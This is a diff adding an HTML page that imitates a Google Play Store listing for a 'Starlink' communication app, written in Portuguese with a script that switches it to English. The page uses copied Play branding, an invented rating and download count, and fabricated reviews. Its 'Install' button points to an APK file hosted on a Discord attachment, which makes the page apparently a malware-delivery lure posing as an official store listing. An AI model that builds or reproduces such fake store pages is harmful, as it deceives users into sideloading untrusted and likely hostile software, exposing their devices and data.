@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Starlink - Apps no Google Play</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Roboto, Arial, sans-serif;
+      background: #f1f3f4;
+      color: #202124;
+    }
+
+    .header {
+      background: #fff;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .header img {
+      height: 28px;
+    }
+
+    .container {
+      max-width: 960px;
+      margin: 30px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    .app-header {
+      display: flex;
+      gap: 20px;
+    }
+
+    .app-header img {
+      width: 96px;
+      height: 96px;
+      border-radius: 20%;
+      object-fit: cover;
+    }
+
+    .app-info h1 {
+      font-size: 22px;
+      margin: 0;
+    }
+
+    .app-info p {
+      margin: 4px 0;
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .install-btn {
+      margin-top: 15px;
+      display: inline-block;
+      background: #34a853; /* Verde oficial */
+      color: #fff;
+      padding: 10px 24px;
+      border-radius: 4px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background 0.2s ease;
+    }
+
+    .install-btn:hover {
+      background: #2c8a43;
+    }
+
+    /* Carrossel */
+    .screenshots {
+      margin-top: 30px;
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      padding-bottom: 10px;
+    }
+
+    .screenshots img {
+      height: 180px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      flex-shrink: 0;
+    }
+
+    .about {
+      margin-top: 30px;
+    }
+
+    .about h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .about p, .about li {
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    /* Avaliações */
+    .reviews {
+      margin-top: 30px;
+    }
+
+    .reviews h2 {
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+
+    .review {
+      border-top: 1px solid #ddd;
+      padding: 15px 0;
+      display: flex;
+      gap: 15px;
+    }
+
+    .review:first-child {
+      border-top: none;
+    }
+
+    .review img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    .review-content {
+      flex: 1;
+    }
+
+    .review strong {
+      font-size: 14px;
+      color: #202124;
+    }
+
+    .stars {
+      color: #fbbc04;
+      font-size: 14px;
+      margin: 3px 0;
+    }
+
+    .review p {
+      font-size: 14px;
+      margin: 5px 0 0;
+      color: #444;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 13px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <!-- Topo com logo Play Store -->
+  <div class="header">
+    <img src="https://www.gstatic.com/android/market_images/web/play_prism_hlock_2x.png" alt="Google Play">
+  </div>
+
+  <!-- Container principal -->
+  <div class="container">
+    <!-- Cabeçalho do App -->
+    <div class="app-header">
+      <!-- Ícone atualizado para Starlink -->
+      <img src="https://play-lh.googleusercontent.com/Y7w0yno71k_WgFm9bqb71Ymz6ixKxvNhbBvROOK813EFoMWFTmdRC1tXVFG3A3uk_Uw=w240-h480-rw" alt="Logo Starlink">
+      <div class="app-info">
+        <!-- Nome alterado para Starlink -->
+        <h1>Starlink</h1>
+        <p>Starlink Inc. · Comunicação</p>
+        <p>⭐ 4,8 · Mais de 50 milhões de downloads</p>
+        <a href="https://cdn.discordapp.com/attachments/1430368433861558425/1430368861760520202/signed.apk?ex=68f9864f&is=68f834cf&hm=5d06b35fc11e664dedef2448539a8224431830f76db39bfab5624571809f2a2c&" class="install-btn">Instalar</a>
+      </div>
+    </div>
+
+    <!-- Carrossel de imagens atualizado -->
+    <div class="screenshots">
+      <!-- Primeira imagem do carrossel -->
+      <img src="https://play-lh.googleusercontent.com/xREJ8xnqAy6rmrwyippqa_JYU8tQOy6X-K3bh96TsouP53cC1iByjoN2XdwQpDK6lBQ=w526-h296-rw" alt="Interface Starlink">
+      <!-- Segunda imagem do carrossel -->
+      <img src="https://play-lh.googleusercontent.com/h8Lc7BYn81Rgu3i7Lu3nAqK4Nc7rrP3xkOiXc4D5F7S69jqzOsDaW8a90qWFRwtPrFWE=w526-h296-rw" alt="Recursos Starlink">
+      <!-- Terceira imagem do carrossel -->
+      <img src="https://play-lh.googleusercontent.com/Lp8gjGywI-h9rdYhMQo2AnNgHPx_axrLqYrapkktjmTRpnggVdEJWcWnUhlSE4Fg2EAP=w526-h296-rw" alt="Funcionalidades Starlink">
+      <!-- Quarta imagem do carrossel -->
+      <img src="https://play-lh.googleusercontent.com/I7AWVExuZW4H5mFl0tAtx9qyFJ1MdOSZ_DPJ00FMdjHDRycyCk1xO87HbPZk9ULJGg=w526-h296-rw" alt="Experiência Starlink">
+    </div>
+
+    <!-- Sobre este app -->
+    <div class="about">
+      <h2>Sobre este app</h2>
+      <p>
+        O Starlink é um app de comunicação moderno e intuitivo, desenvolvido para conectar pessoas de forma rápida e eficiente.  
+        Recursos principais:
+      </p>
+      <ul>
+        <li>Comunicação instantânea com alta qualidade</li>
+        <li>Chamadas de voz e vídeo em HD</li>
+        <li>Compartilhamento seguro de arquivos</li>
+        <li>Grupos e comunidades organizadas</li>
+        <li>Modo offline para maior flexibilidade</li>
+      </ul>
+      <p>
+        Baixe agora o Starlink e comece a se conectar com pessoas ao redor do mundo.
+      </p>
+    </div>
+
+    <!-- Avaliações -->
+    <div class="reviews">
+      <h2>Classificações e resenhas</h2>
+
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/women/32.jpg" alt="Ana">
+        <div class="review-content">
+          <strong>Ana Silva</strong>
+          <div class="stars">⭐⭐⭐⭐⭐</div>
+          <p>App incrível! A qualidade das chamadas é excelente e a interface é muito intuitiva!</p>
+        </div>
+      </div>
+
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/45.jpg" alt="Ricardo">
+        <div class="review-content">
+          <strong>Ricardo Oliveira</strong>
+          <div class="stars">⭐⭐⭐⭐</div>
+          <p>Muito bom, só acho que poderia ter mais opções de personalização.</p>
+        </div>
+      </div>
+
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/women/28.jpg" alt="Beatriz">
+        <div class="review-content">
+          <strong>Beatriz Lima</strong>
+          <div class="stars">⭐⭐⭐⭐⭐</div>
+          <p>Melhor app de comunicação que já usei! Interface limpa e recursos muito úteis para o dia a dia.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Rodapé -->
+  <div class="footer">
+    © 2025 - Google Play Store.
+  </div>
+
+  <script>
+    // Detecção automática de idioma baseada na localidade
+    const userLanguage = navigator.language || navigator.userLanguage;
+    const isPortuguese = userLanguage.startsWith('pt');
+    
+    if (!isPortuguese) {
+      // Traduções para inglês (poderia ser expandido para outros idiomas)
+      document.querySelector('title').textContent = 'Starlink - Apps on Google Play';
+      document.querySelector('h1').textContent = 'Starlink';
+      document.querySelector('.app-info p:nth-child(2)').textContent = 'Starlink Inc. · Communication';
+      document.querySelector('.app-info p:nth-child(3)').textContent = '⭐ 4.8 · Over 50 million downloads';
+      document.querySelector('.install-btn').textContent = 'Install';
+      document.querySelector('.about h2').textContent = 'About this app';
+      document.querySelector('.about p').innerHTML = 'Starlink is a modern and intuitive communication app, designed to connect people quickly and efficiently. Main features:';
+      document.querySelector('.about ul').innerHTML = `
+        <li>Instant communication with high quality</li>
+        <li>HD voice and video calls</li>
+        <li>Secure file sharing</li>
+        <li>Organized groups and communities</li>
+        <li>Offline mode for more flexibility</li>
+      `;
+      document.querySelector('.about p:last-child').textContent = 'Download Starlink now and start connecting with people around the world.';
+      document.querySelector('.reviews h2').textContent = 'Ratings and reviews';
+      
+      // Atualizar avaliações em inglês
+      const reviews = document.querySelectorAll('.review-content p');
+      reviews[0].textContent = 'Amazing app! The call quality is excellent and the interface is very intuitive!';
+      reviews[1].textContent = 'Very good, but I think it could have more customization options.';
+      reviews[2].textContent = 'Best communication app I have ever used! Clean interface and very useful features for daily use.';
+      
+      document.querySelector('.footer').textContent = '© 2025 - Google Play Store.';
+    }
+  </script>
+</body>
+</html>
